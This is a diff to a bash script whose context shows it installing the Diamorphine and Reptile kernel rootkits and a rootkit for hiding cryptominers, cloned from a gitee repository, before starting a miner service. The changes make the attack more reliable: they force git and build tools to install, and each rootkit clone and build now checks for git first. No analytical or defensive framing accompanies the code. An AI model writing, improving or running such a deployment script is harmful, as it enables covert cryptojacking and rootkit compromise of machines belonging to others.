@@ -21,6 +21,32 @@ trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 export GIT_TERMINAL_PROMPT=0
 git config --global credential.helper "" 2>/dev/null || true
 
+# ==================== HELPER FUNCTION: ENSURE GIT ====================
+ensure_git_available() {
+    if ! command -v git >/dev/null 2>&1; then
+        echo "[!] ERROR: git is not available"
+        echo "[*] Attempting to install git..."
+        
+        if command -v apt-get >/dev/null 2>&1; then
+            apt-get update >/dev/null 2>&1
+            DEBIAN_FRONTEND=noninteractive apt-get install -y git 2>&1 | tail -3
+        elif command -v yum >/dev/null 2>&1; then
+            yum install -y git 2>&1 | tail -3
+        elif command -v dnf >/dev/null 2>&1; then
+            dnf install -y git 2>&1 | tail -3
+        fi
+        
+        # Check again
+        if ! command -v git >/dev/null 2>&1; then
+            echo "[!] CRITICAL: Failed to install git"
+            return 1
+        fi
+        
+        echo "[✓] git installed successfully"
+    fi
+    return 0
+}
+
 # ==================== ARCHITECTURE DETECTION ====================
 # Detect if system is 32-bit or 64-bit to skip incompatible rootkits
 ARCH=$(uname -m)
@@ -328,23 +354,54 @@ echo "[✓] Cleanup complete"
 # ==================== ENSURE DEPENDENCIES ====================
 echo "[*] Installing dependencies..."
 
-# Update package lists (suppress output)
-$PKG_UPDATE >/dev/null 2>&1 || true
+# Update package lists
+echo "[*] Updating package lists..."
+$PKG_UPDATE 2>&1 | grep -E "Reading|Building|Fetched" || true
 
-# Core dependencies
-DEPS="wget curl git make gcc g++ build-essential linux-headers-$(uname -r)"
+# Critical dependencies that MUST be installed
+CRITICAL_DEPS="git make gcc"
+PACKAGE_DEPS="build-essential linux-headers-$(uname -r) wget curl"
 
-# Install each dependency individually with error handling
-for dep in $DEPS; do
-    if ! command -v "$dep" >/dev/null 2>&1 && ! dpkg -l | grep -q "^ii.*$dep" 2>/dev/null; then
+# Install critical dependencies first with visible output
+for dep in $CRITICAL_DEPS; do
+    if ! command -v "$dep" >/dev/null 2>&1; then
+        echo "[*] Installing critical dependency: $dep..."
+        DEBIAN_FRONTEND=noninteractive $PKG_INSTALL "$dep" 2>&1 | tail -5
+        
+        # Verify it was installed
+        if ! command -v "$dep" >/dev/null 2>&1; then
+            echo "[!] CRITICAL ERROR: Failed to install $dep"
+            echo "[!] $dep is required for the script to work"
+            echo "[!] Please install manually: $PKG_INSTALL $dep"
+            exit 1
+        else
+            echo "[✓] $dep installed successfully"
+        fi
+    else
+        echo "[✓] $dep already installed"
+    fi
+done
+
+# Install package dependencies (can fail without stopping script)
+for dep in $PACKAGE_DEPS; do
+    # Check if package is installed (for packages, not commands)
+    if ! dpkg -l 2>/dev/null | grep -q "^ii.*$dep" 2>/dev/null; then
         echo "[*] Installing $dep..."
         DEBIAN_FRONTEND=noninteractive $PKG_INSTALL "$dep" >/dev/null 2>&1 || {
-            echo "[!] Failed to install $dep, continuing..."
+            echo "[!] Warning: Failed to install $dep, continuing..."
         }
     fi
 done
 
-echo "[✓] Dependencies installation complete"
+# Final verification of git
+if ! command -v git >/dev/null 2>&1; then
+    echo "[!] CRITICAL ERROR: git is not available after installation"
+    echo "[!] Cannot proceed without git"
+    exit 1
+fi
+
+echo "[✓] All dependencies installation complete"
+echo "[✓] Git version: $(git --version)"
 
 # ==================== DETECT DOWNLOAD TOOL ====================
 USE_WGET=false
@@ -666,6 +723,12 @@ install_diamorphine() {
     
     rm -rf diamorphine 2>/dev/null
     
+    # Ensure git is available
+    if ! ensure_git_available; then
+        echo "[!] Cannot clone Diamorphine without git"
+        return 1
+    fi
+    
     # Clone and build
     echo "[*] Cloning Diamorphine..."
     export GIT_TERMINAL_PROMPT=0
@@ -739,6 +802,12 @@ install_reptile() {
         echo "[*] Unloading old Reptile module..."
         rmmod reptile 2>/dev/null || true
         sleep 1
+    fi
+    
+    # Ensure git is available
+    if ! ensure_git_available; then
+        echo "[!] Cannot clone Reptile without git"
+        return 1
     fi
     
     # Clone Reptile (disable interactive prompts)
@@ -828,8 +897,13 @@ else
     $PKG_INSTALL "linux-headers-$KERNEL_VER" 2>/dev/null || true
 fi
 
-# Clone and build the crypto-miner rootkit
-echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
+# Ensure git is available
+if ! ensure_git_available; then
+    echo "[!] Cannot clone crypto-miner rootkit without git"
+    echo "[!] Skipping crypto-miner rootkit installation"
+else
+    # Clone and build the crypto-miner rootkit
+    echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
 export GIT_TERMINAL_PROMPT=0
 if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
     unset GIT_TERMINAL_PROMPT
@@ -864,6 +938,7 @@ else
     echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
     unset GIT_TERMINAL_PROMPT
 fi
+fi  # End of ensure_git_available check
 
 # ==================== START MINER SERVICE ====================
 echo ''
